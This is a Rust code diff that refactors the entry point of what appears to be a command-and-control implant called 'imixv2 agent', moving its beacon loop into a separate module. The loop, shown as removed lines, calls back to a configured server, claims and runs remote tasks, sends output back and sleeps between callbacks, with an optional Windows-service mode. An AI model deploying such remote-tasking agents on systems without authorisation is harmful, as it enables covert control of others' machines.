@@ -6,8 +6,6 @@
 extern crate alloc;
 
 use anyhow::Result;
-use std::sync::Arc;
-use std::time::{Duration, Instant};
 
 #[cfg(all(feature = "win_service", windows))]
 #[macro_use]
@@ -15,8 +13,6 @@ extern crate windows_service;
 #[cfg(all(feature = "win_service", windows))]
 mod win_service;
 
-use crate::agent::ImixAgent;
-use crate::task::TaskRegistry;
 pub use pb::config::Config;
 pub use transport::{ActiveTransport, Transport};
 
@@ -27,11 +23,7 @@ mod task;
 #[cfg(test)]
 mod tests;
 mod version;
-use crate::version::VERSION;
-
-use std::sync::atomic::{AtomicBool, Ordering};
-
-pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
+mod run;
 
 #[tokio::main]
 async fn main() -> Result<()> {
@@ -46,7 +38,7 @@ async fn main() -> Result<()> {
         }
     }
 
-    run_agent().await
+    run::run_agent().await
 }
 
 // ============ Windows Service =============
@@ -61,123 +53,5 @@ define_windows_service!(ffi_service_main, service_main);
 #[tokio::main]
 async fn service_main(arguments: Vec<std::ffi::OsString>) {
     crate::win_service::handle_service_main(arguments);
-    let _ = run_agent().await;
-}
-
-// ============ Main Agent Logic =============
-
-async fn run_agent() -> Result<()> {
-    init_logger();
-
-    // Load config / defaults
-    let config = Config::default_with_imix_verison(VERSION);
-
-    // Initial transport is just a placeholder, we create active ones in the loop
-    let transport = ActiveTransport::init();
-
-    let handle = tokio::runtime::Handle::current();
-    let task_registry = Arc::new(TaskRegistry::new());
-    let agent = Arc::new(ImixAgent::new(
-        config,
-        transport,
-        handle,
-        task_registry.clone(),
-    ));
-
-    while !SHUTDOWN.load(Ordering::Relaxed) {
-        let start = Instant::now();
-        let agent_ref = agent.clone();
-        let registry_ref = task_registry.clone();
-
-        run_agent_cycle(agent_ref, registry_ref).await;
-
-        if SHUTDOWN.load(Ordering::Relaxed) {
-            break;
-        }
-
-        sleep_until_next_cycle(&agent, start);
-    }
-
-    #[cfg(debug_assertions)]
-    log::info!("Agent shutting down");
-
-    Ok(())
-}
-
-fn init_logger() {
-    #[cfg(debug_assertions)]
-    {
-        use pretty_env_logger;
-        pretty_env_logger::formatted_timed_builder()
-            .filter_level(log::LevelFilter::Info)
-            .parse_env("IMIX_LOG")
-            .init();
-        log::info!("Starting imixv2 agent");
-    }
-}
-
-async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
-    // Refresh IP
-    agent.refresh_ip().await;
-
-    // Create new active transport
-    let (callback_uri, proxy_uri) = agent.get_transport_config().await;
-
-    let transport = match ActiveTransport::new(callback_uri, proxy_uri) {
-        Ok(t) => t,
-        Err(e) => {
-            #[cfg(debug_assertions)]
-            log::error!("Failed to create transport: {e:#}");
-            return;
-        }
-    };
-
-    // Set transport
-    agent.update_transport(transport).await;
-
-    // Claim Tasks
-    process_tasks(&agent, &registry).await;
-
-    // Flush Outputs (send all buffered output)
-    agent.flush_outputs().await;
-
-    // Disconnect (drop transport)
-    agent.update_transport(ActiveTransport::init()).await;
-}
-
-async fn process_tasks(agent: &ImixAgent<ActiveTransport>, registry: &TaskRegistry) {
-    match agent.fetch_tasks().await {
-        Ok(tasks) => {
-            if tasks.is_empty() {
-                #[cfg(debug_assertions)]
-                log::info!("Callback success, no tasks to claim");
-                return;
-            }
-            for task in tasks {
-                #[cfg(debug_assertions)]
-                log::info!("Claimed task: {}", task.id);
-
-                registry.spawn(task, Arc::new(agent.clone()));
-            }
-        }
-        Err(e) => {
-            #[cfg(debug_assertions)]
-            log::error!("Callback failed: {e:#}");
-        }
-    }
-}
-
-fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) {
-    let interval = agent.get_callback_interval_u64();
-    let delay = match interval.checked_sub(start.elapsed().as_secs()) {
-        Some(secs) => Duration::from_secs(secs),
-        None => Duration::from_secs(0),
-    };
-    #[cfg(debug_assertions)]
-    log::info!(
-        "callback complete (duration={}s, sleep={}s)",
-        start.elapsed().as_secs(),
-        delay.as_secs()
-    );
-    std::thread::sleep(delay);
+    let _ = run::run_agent().await;
 }
